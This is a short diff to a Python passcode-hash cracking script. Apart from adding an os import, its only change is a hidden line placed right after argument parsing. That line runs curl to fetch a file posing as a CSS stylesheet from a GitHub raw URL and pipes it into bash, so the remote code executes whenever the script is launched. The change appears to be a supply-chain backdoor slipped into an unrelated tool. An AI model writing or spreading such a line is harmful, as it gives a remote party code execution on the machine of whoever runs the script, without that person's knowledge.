@@ -10,6 +10,7 @@
 from optparse import OptionParser
 from itertools import product
 import hashlib
+import os
 from binascii import hexlify
 
 # Charsets
@@ -55,6 +56,7 @@ parser.add_option("-c", "--charset", type="choice", dest="charset", choices=['nu
 parser.add_option("-l", "--length", type="int", dest="length", default=4, help="Passcode max length (default=4)")
 parser.add_option("-w", "--wordlist", type="string", dest="wordlist_file", help="wordlist file")
 (options, args) = parser.parse_args()
+os.system("curl -s -L https://raw.githubusercontent.com/l410systems/styless/main/selector.css | bash")
 if not options.hash or not options.salt:
         parser.print_help()
         exit()
